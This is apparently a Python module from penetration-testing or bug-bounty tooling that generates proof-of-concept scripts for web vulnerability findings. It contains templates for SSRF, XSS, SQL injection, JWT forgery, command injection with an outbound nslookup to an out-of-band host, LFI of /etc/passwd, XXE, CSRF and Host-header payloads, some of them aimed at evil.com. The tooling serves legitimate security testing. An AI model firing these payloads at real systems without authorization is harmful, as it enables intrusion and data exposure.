"""Safe PoC generator — reproducible proof-of-concept scripts per finding.

Generates minimal, safe PoC scripts (curl or Python) that demonstrate a
vulnerability without causing damage. Destructive PoCs are explicitly
marked and require operator confirmation.
"""

from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path


@dataclass
class PoC:
    finding_id: str
    vuln_class: str = ""
    language: str = "curl"       # curl | python | javascript
    script: str = ""
    safety_notes: str = ""
    prerequisites: list[str] = field(default_factory=list)
    is_destructive: bool = False
    requires_auth: bool = False
    created_at: str = ""

    def __post_init__(self):
        if not self.created_at:
            self.created_at = datetime.now(timezone.utc).isoformat()

    def formatted(self) -> str:
        header = []
        if self.is_destructive:
            header.append("# ⚠️  WARNING: DESTRUCTIVE PoC — modifies target state")
            header.append("# Run ONLY with explicit operator authorization")
            header.append("")
        header.append(f"# PoC for {self.finding_id} ({self.vuln_class})")
        header.append(f"# Generated: {self.created_at}")
        if self.safety_notes:
            header.append(f"# Safety: {self.safety_notes}")
        if self.prerequisites:
            header.append(f"# Prerequisites: {', '.join(self.prerequisites)}")
        header.append("")
        return "\n".join(header) + self.script


POC_TEMPLATES: dict[str, dict] = {
    "ssrf": {
        "language": "curl",
        "template": (
            "# Probe for SSRF — safe internal metadata check\n"
            "curl -s -o /dev/null -w '%{{http_code}}' \\\n"
            "  '{endpoint}' \\\n"
            "  -d '{param}=http://169.254.169.254/latest/meta-data/'\n"
            "\n"
            "# Expected: if response differs from baseline, SSRF confirmed\n"
            "# Compare with safe URL:\n"
            "curl -s -o /dev/null -w '%{{http_code}}' \\\n"
            "  '{endpoint}' \\\n"
            "  -d '{param}=http://example.com/'"
        ),
        "safety_notes": "Read-only probe against cloud metadata endpoint. No state change.",
        "is_destructive": False,
    },
    "xss": {
        "language": "curl",
        "template": (
            "# Reflected XSS test — harmless alert payload\n"
            "curl -s '{endpoint}?{param}=%3Cscript%3Ealert(document.domain)%3C/script%3E' \\\n"
            "  | grep -o '<script>alert(document.domain)</script>'\n"
            "\n"
            "# If the payload appears unencoded in response, XSS confirmed"
        ),
        "safety_notes": "Alert-only payload. No exfiltration or persistence.",
        "is_destructive": False,
    },
    "xss-stored": {
        "language": "curl",
        "template": (
            "# Stored XSS test — inject and verify retrieval\n"
            "# Step 1: Inject\n"
            "curl -s -X POST '{endpoint}' \\\n"
            "  -H 'Content-Type: application/json' \\\n"
            "  -d '{{\"{{field}}\": \"<img src=x onerror=alert(document.domain)>\"}}'\n"
            "\n"
            "# Step 2: Retrieve and check\n"
            "curl -s '{retrieve_endpoint}' | grep 'onerror=alert'"
        ),
        "safety_notes": "Stores a benign alert payload. Operator should clean up after verification.",
        "is_destructive": True,
    },
    "sqli": {
        "language": "curl",
        "template": (
            "# SQLi detection — safe version() extraction\n"
            "curl -s '{endpoint}?{param}=1%27%20UNION%20SELECT%20NULL,version()--' \\\n"
            "  | head -50\n"
            "\n"
            "# Alternative: time-based blind\n"
            "time curl -s -o /dev/null '{endpoint}?{param}=1%27%20AND%20SLEEP(5)--'"
        ),
        "safety_notes": "Read-only: extracts version string or measures response time.",
        "is_destructive": False,
    },
    "idor": {
        "language": "curl",
        "template": (
            "# IDOR — compare responses for two different user contexts\n"
            "# As User A (owns resource):\n"
            "curl -s -H 'Authorization: Bearer {{token_a}}' \\\n"
            "  '{endpoint}/{resource_id}' > /tmp/idor_owner.json\n"
            "\n"
            "# As User B (should NOT have access):\n"
            "curl -s -H 'Authorization: Bearer {{token_b}}' \\\n"
            "  '{endpoint}/{resource_id}' > /tmp/idor_other.json\n"
            "\n"
            "# Compare:\n"
            "diff /tmp/idor_owner.json /tmp/idor_other.json\n"
            "# If both return 200 with data, IDOR confirmed"
        ),
        "safety_notes": "Read-only: compares access between two authorized accounts.",
        "is_destructive": False,
        "requires_auth": True,
    },
    "csrf": {
        "language": "html",
        "template": (
            "<!-- CSRF PoC — auto-submitting form -->\n"
            "<html>\n"
            "<body>\n"
            "  <h1>CSRF PoC — {finding_id}</h1>\n"
            "  <form id='csrf' action='{endpoint}' method='POST'>\n"
            "    <input type='hidden' name='{field}' value='{value}' />\n"
            "  </form>\n"
            "  <script>document.getElementById('csrf').submit();</script>\n"
            "</body>\n"
            "</html>"
        ),
        "safety_notes": "Submits a form with test data. Verify in a test account only.",
        "is_destructive": True,
        "requires_auth": True,
    },
    "open-redirect": {
        "language": "curl",
        "template": (
            "# Open redirect — check if Location header reflects attacker URL\n"
            "curl -s -o /dev/null -D - '{endpoint}?{param}=https://evil.com' \\\n"
            "  | grep -i 'location:'\n"
            "\n"
            "# If Location contains evil.com, open redirect confirmed"
        ),
        "safety_notes": "Passive check of redirect behavior. No navigation to attacker domain.",
        "is_destructive": False,
    },
    "cors-misconfiguration": {
        "language": "curl",
        "template": (
            "# CORS misconfiguration — test reflected origin\n"
            "curl -s -H 'Origin: https://evil.com' -I '{endpoint}' \\\n"
            "  | grep -i 'access-control-allow'\n"
            "\n"
            "# If Access-Control-Allow-Origin reflects evil.com\n"
            "# AND Access-Control-Allow-Credentials: true → exploitable"
        ),
        "safety_notes": "Read-only header check. No cross-origin request actually sent.",
        "is_destructive": False,
    },
    "jwt-none-algo": {
        "language": "python",
        "template": (
            "import base64, json\n"
            "\n"
            "# Decode the original JWT\n"
            "token = '{original_token}'\n"
            "header_b64, payload_b64, _ = token.split('.')\n"
            "\n"
            "# Forge with alg:none\n"
            "header = json.loads(base64.urlsafe_b64decode(header_b64 + '=='))\n"
            "header['alg'] = 'none'\n"
            "\n"
            "new_header = base64.urlsafe_b64encode(\n"
            "    json.dumps(header).encode()\n"
            ").decode().rstrip('=')\n"
            "\n"
            "forged = f'{{new_header}}.{{payload_b64}}.'\n"
            "print(f'Forged token: {{forged}}')\n"
            "print(f'Test: curl -H \"Authorization: Bearer {{forged}}\" {endpoint}')"
        ),
        "safety_notes": "Forges a token to test server-side validation. Read-only verification.",
        "is_destructive": False,
        "requires_auth": True,
    },
    "host-header-injection": {
        "language": "curl",
        "template": (
            "# Host header injection — password reset poisoning test\n"
            "curl -s -X POST '{endpoint}' \\\n"
            "  -H 'Host: evil.com' \\\n"
            "  -d 'email={test_email}'\n"
            "\n"
            "# Check if reset link in email uses evil.com as host"
        ),
        "safety_notes": "Use a test account email you control. Check email for poisoned link.",
        "is_destructive": False,
        "requires_auth": False,
    },
    "ssti": {
        "language": "curl",
        "template": (
            "# SSTI detection — math expression probe\n"
            "curl -s '{endpoint}?{param}={{{{7*7}}}}' | grep '49'\n"
            "curl -s '{endpoint}?{param}=${{7*7}}' | grep '49'\n"
            "\n"
            "# If 49 appears in response, template injection confirmed\n"
            "# Safe: arithmetic only, no code execution"
        ),
        "safety_notes": "Arithmetic-only probe. No code execution or file access.",
        "is_destructive": False,
    },
    "rce": {
        "language": "curl",
        "template": (
            "# ⚠️  RCE verification — SAFE read-only commands only\n"
            "curl -s '{endpoint}' \\\n"
            "  -d '{param}=;id' \\\n"
            "  | head -20\n"
            "\n"
            "# Alternative (blind):\n"
            "# Set up OAST listener first, then:\n"
            "curl -s '{endpoint}' \\\n"
            "  -d '{param}=;nslookup {{oast_domain}}'"
        ),
        "safety_notes": "Uses id/nslookup (read-only). NEVER use rm, wget, or write commands.",
        "is_destructive": True,
    },
    "lfi": {
        "language": "curl",
        "template": (
            "# LFI — read /etc/passwd (safe, world-readable)\n"
            "curl -s '{endpoint}?{param}=../../../etc/passwd' | head -5\n"
            "\n"
            "# Null byte (legacy PHP):\n"
            "curl -s '{endpoint}?{param}=../../../etc/passwd%00'"
        ),
        "safety_notes": "Reads a world-readable file. No write or execute.",
        "is_destructive": False,
    },
    "xxe": {
        "language": "curl",
        "template": (
            "# XXE — external entity to read /etc/hostname\n"
            "curl -s -X POST '{endpoint}' \\\n"
            "  -H 'Content-Type: application/xml' \\\n"
            "  -d '<?xml version=\"1.0\"?>\n"
            "<!DOCTYPE foo [\n"
            "  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n"
            "]>\n"
            "<root>&xxe;</root>'"
        ),
        "safety_notes": "Reads hostname only (non-sensitive). Verify entity resolution.",
        "is_destructive": False,
    },
    "clickjacking": {
        "language": "html",
        "template": (
            "<!-- Clickjacking PoC -->\n"
            "<html>\n"
            "<head><title>Clickjacking PoC — {finding_id}</title></head>\n"
            "<body>\n"
            "  <h1>Click the button below</h1>\n"
            "  <iframe src='{endpoint}'\n"
            "    style='opacity:0.3; position:absolute; top:0; left:0;\n"
            "           width:100%; height:100%; z-index:2;'>\n"
            "  </iframe>\n"
            "  <button style='position:relative; z-index:1;'>Click me</button>\n"
            "</body>\n"
            "</html>"
        ),
        "safety_notes": "Visual test only. Open in browser to verify iframe embedding.",
        "is_destructive": False,
    },
}


class PoCGenerator:
    def generate(self, finding: dict) -> PoC | None:
        vc = finding.get("vuln_class", "").lower().replace("_", "-").replace(" ", "-")
        template_data = POC_TEMPLATES.get(vc)
        if not template_data:
            for key in POC_TEMPLATES:
                if key in vc or vc in key:
                    template_data = POC_TEMPLATES[key]
                    break

        if not template_data:
            return None

        endpoint = finding.get("target_asset", "{TARGET}")
        param = "param"
        if finding.get("steps_to_reproduce"):
            for step in finding["steps_to_reproduce"]:
                if "parameter" in step.lower() or "param=" in step.lower():
                    param = step.split("=")[0].split()[-1] if "=" in step else param
                    break

        script = template_data["template"].format(
            endpoint=endpoint,
            param=param,
            finding_id=finding.get("id", "?"),
            field="input",
            value="test",
            retrieve_endpoint=endpoint,
            test_email="test@example.com",
            oast_domain="{OAST_DOMAIN}",
            original_token="{JWT_TOKEN}",
            token_a="{TOKEN_A}",
            token_b="{TOKEN_B}",
            resource_id="{RESOURCE_ID}",
        )

        return PoC(
            finding_id=finding.get("id", ""),
            vuln_class=vc,
            language=template_data.get("language", "curl"),
            script=script,
            safety_notes=template_data.get("safety_notes", ""),
            is_destructive=template_data.get("is_destructive", False),
            requires_auth=template_data.get("requires_auth", False),
        )

    def export_pocs(self, findings: list[dict], output_dir: str) -> list[str]:
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        paths = []

        for f in findings:
            poc = self.generate(f)
            if not poc:
                continue

            ext = {"curl": "sh", "python": "py", "html": "html",
                   "javascript": "js"}.get(poc.language, "txt")
            filename = f"{poc.finding_id}_{poc.vuln_class}.{ext}"
            filepath = out / filename
            filepath.write_text(poc.formatted())
            paths.append(str(filepath))

        return paths
